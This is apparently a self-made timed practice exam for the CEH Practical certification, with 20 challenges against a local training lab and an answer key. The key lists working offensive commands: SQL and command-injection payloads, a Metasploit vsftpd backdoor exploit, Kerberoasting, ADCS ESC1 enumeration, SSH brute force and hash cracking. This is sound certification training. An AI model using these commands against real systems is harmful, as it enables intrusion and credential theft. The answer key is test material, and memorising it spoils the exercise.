# Simulated Practical Exam 01

> **6 hours · 20 challenges · ~18 min each · pass ≈ 14/20.** Sit it in one timed block with **no peeking** at the answer key until you're done. Read each question *exactly* — the answer is one precise string (a password, version, FQDN, hash, flag, or file contents); case and trailing characters count. Keep a notes file and screenshot every answer before you submit it.
>
> **Setup:** the [lab](../../labs/README.md) running (Kali `192.168.56.10`, Metasploitable2 `192.168.56.20` = `msfadmin`/`msfadmin`, DC/ADCS `192.168.56.30` = `ceh.lab`, foothold `jdoe`/`Passw0rd!`, Docker web `localhost:8081–8084`) **and** the [challenge-lab](../challenge-lab/README.md) generated to `~/ceh-practical-challenges/`. All flags are wrapped as `CEH{...}` — submit them verbatim. Recipes: [`../challenge-playbooks.md`](../challenge-playbooks.md).
>
> These are practice simulations built on your own lab — **not** real or leaked exam content.

## Challenges

### Challenge 1
Fingerprint the FTP service listening on the network target. Submit the **exact service/version string** nmap reports for TCP/21.
⏱️ ~8 min · Target: Metasploitable2 (`192.168.56.20`)

### Challenge 2
The file `hashes/hashes.txt` holds several hashes of different types. Identify and crack the **MD5** entry. What is its plaintext?
⏱️ ~5 min · Artifact: `~/ceh-practical-challenges/hashes/`

### Challenge 3
`stego/vacation.jpg` was pulled from a suspect's laptop. A flag is sitting inside the file in the clear. **Recover it.**
⏱️ ~4 min · Artifact: `~/ceh-practical-challenges/stego/vacation.jpg`

### Challenge 4
The DVWA instance (security = **low**) exposes a SQL-injectable `id` parameter. Dump the `users` table, then crack the **administrator** account's password hash. What is the admin's plaintext password?
⏱️ ~15 min · Target: DVWA (`http://localhost:8081`)

### Challenge 5
`crypto/mystery.txt` is a flag wrapped in **three stacked transforms**. Peel them and submit the flag.
⏱️ ~8 min · Artifact: `~/ceh-practical-challenges/crypto/`

### Challenge 6
On the domain `ceh.lab`, the service account `svc-sql` is registered with an SPN. Starting from the foothold user `jdoe` / `Passw0rd!`, **Kerberoast** the account and crack the recovered ticket. What is `svc-sql`'s plaintext password?
⏱️ ~18 min · Target: DC/ADCS (`192.168.56.30`)

### Challenge 7
`pcap/traffic.pcap` captured a user logging into a web portal. **Recover the password** submitted in the login request.
⏱️ ~8 min · Artifact: `~/ceh-practical-challenges/pcap/`

### Challenge 8
Identify the **fully-qualified domain name (FQDN)** of the domain controller.
⏱️ ~6 min · Target: DC (`192.168.56.30`)

### Challenge 9
Using DVWA's **Command Injection** page (security = low), execute a command on the server. What **OS user** is the web application running as?
⏱️ ~10 min · Target: DVWA (`http://localhost:8081`)

### Challenge 10
The FTP daemon on the network target carries a well-known **backdoor**. Exploit it to land a shell, then read the first line of `/etc/passwd`. What **login shell** is configured for `root`?
⏱️ ~12 min · Target: Metasploitable2 (`192.168.56.20`)

### Challenge 11
`crypto/secret.aes.enc` is **AES-256-CBC (pbkdf2)**; the passphrase is in `crypto/README.txt`. Decrypt it and submit the flag.
⏱️ ~5 min · Artifact: `~/ceh-practical-challenges/crypto/`

### Challenge 12
`stego/beach.jpg` was produced with **steghide** (passphrase `hacktheplanet`). Extract the embedded flag.
⏱️ ~6 min · Artifact: `~/ceh-practical-challenges/stego/`

### Challenge 13
Back in `hashes/hashes.txt`, one entry is a **bcrypt** (`$2*`) hash. Crack it. What is the plaintext?
⏱️ ~12 min · Artifact: `~/ceh-practical-challenges/hashes/`

### Challenge 14
You're handed the aircrack-ng **sample WPA capture** (`wpa.cap`, ESSID `test`). Recover the Wi-Fi **passphrase** using the `rockyou` wordlist.
⏱️ ~10 min · Artifact: aircrack-ng sample capture (on Kali `192.168.56.10`)

### Challenge 15
Enumerate the **SMB shares** exposed by the network target without credentials. Name the **non-administrative** share that is world-readable/writable.
⏱️ ~8 min · Target: Metasploitable2 (`192.168.56.20`)

### Challenge 16
From the same DVWA `users` table, crack the hash for the user **`gordonb`**. What is `gordonb`'s password?
⏱️ ~10 min · Target: DVWA (`http://localhost:8081`)

### Challenge 17
Recover the **SSH password** for the `msfadmin` account by online brute force.
⏱️ ~8 min · Target: Metasploitable2 (`192.168.56.20`)

### Challenge 18
`archives/secret.zip` is password-protected. **Crack the archive password** (submit the password itself, not the flag inside).
⏱️ ~10 min · Artifact: `~/ceh-practical-challenges/archives/`

### Challenge 19
As `jdoe` on `ceh.lab`, the CA publishes a misconfigured certificate template that lets a low-privileged user escalate to **Domain Admin** (ADCS **ESC1**). Using `certipy`, identify the **name of the vulnerable template**.
⏱️ ~18 min · Target: DC/ADCS (`192.168.56.30`)

### Challenge 20
During triage you find the token `Q0VILVBSQUNUSUNBTA==` in a config file. **Decode it** to its plaintext value.
⏱️ ~4 min · Artifact: self-contained string

---

## Answer key

<details><summary>Reveal the answer key</summary>

| # | Answer | Method (module) |
|---|---|---|
| 1 | `vsftpd 2.3.4` | `sudo nmap -sV -p21 192.168.56.20` — read the VERSION column (scanning) |
| 2 | `iloveyou` | `hashid` to confirm MD5 → `hashcat -m 0 hashes.txt rockyou.txt` (hash cracking) |
| 3 | `CEH{plain_strings_in_the_file}` | `strings vacation.jpg \| grep CEH` (steganography) |
| 4 | `password` | `1' UNION SELECT user,password FROM users-- -` → crack MD5 `hashcat -m 0` (SQL injection) |
| 5 | `CEH{layered_encoding_is_not_encryption}` | `base64 -d \| tr 'A-Za-z' 'N-ZA-Mn-za-m' \| xxd -r -p` — or CyberChef "Magic" (encoding) |
| 6 | `Passw0rd!` | `impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30 -request` → `hashcat -m 13100` (AD / Kerberoast) |
| 7 | `Summer2025!` | Wireshark → Follow TCP Stream, or `tshark -r traffic.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data` (sniffing) |
| 8 | `dc01.ceh.lab` | `nmap --script smb-os-discovery -p445 192.168.56.30` (enumeration) |
| 9 | `www-data` | DVWA Command Injection: `127.0.0.1; whoami` (web / command injection) |
| 10 | `/bin/bash` | `use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.20; run` → `head -1 /etc/passwd` (exploitation) |
| 11 | `CEH{aes_with_a_known_key}` | `openssl enc -d -aes-256-cbc -pbkdf2 -k s3cr3tkey -in secret.aes.enc` (crypto) |
| 12 | `CEH{steghide_embedded_flag}` | `steghide extract -sf beach.jpg -p hacktheplanet` (steganography) |
| 13 | `superman` | `hashcat -m 3200 hashes.txt rockyou.txt` — bcrypt (hash cracking) |
| 14 | `biscotte` | `aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa.cap` (wireless / WPA) |
| 15 | `tmp` | `smbclient -L //192.168.56.20 -N`, or `nxc smb 192.168.56.20 -u '' -p '' --shares` (enumeration) |
| 16 | `abc123` | dump DVWA `users` → crack `gordonb`'s MD5 with `hashcat -m 0` (SQL injection) |
| 17 | `msfadmin` | `hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4 -f` (online cracking) |
| 18 | `letmein` | `zip2john secret.zip > z.hash` → `john z.hash --wordlist=rockyou.txt` (or `hashcat -m 17200`) (archive cracking) |
| 19 | `ESC1-Vuln` | `certipy find -u jdoe@ceh.lab -p 'Passw0rd!' -dc-ip 192.168.56.30 -vulnerable -stdout` (ADCS ESC1 / privesc) |
| 20 | `CEH-PRACTICAL` | `echo 'Q0VILVBSQUNUSUNBTA==' \| base64 -d` (encoding) |

> Flags are literal — submit the whole `CEH{...}` string. Watch case on the passwords (`Passw0rd!`, `Summer2025!`).

</details>

## Scoring

Score one point per exact answer, then check yourself against the real cut on the [EC-Council Practical page](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh-practical/):

- **18–20 — excellent.** Exam-ready. You have the *speed*, not just the knowledge — book it.
- **14–17 — pass.** Over the ~70% line, but tighten the domains you lost points in before exam day.
- **< 14 — keep drilling.** Note which domains cost you points and go back to the deep packs in [`../drills/`](../drills/README.md) (and the quick sampler in [`../drills.md`](../drills.md)) until each type is ✅ under time, then re-sit this exam.

> Re-drill honestly: a stalled challenge you skip and return to always beats one you drown in. Log your result in [`../../PROGRESS.md`](../../PROGRESS.md) and re-run the domains that stung.
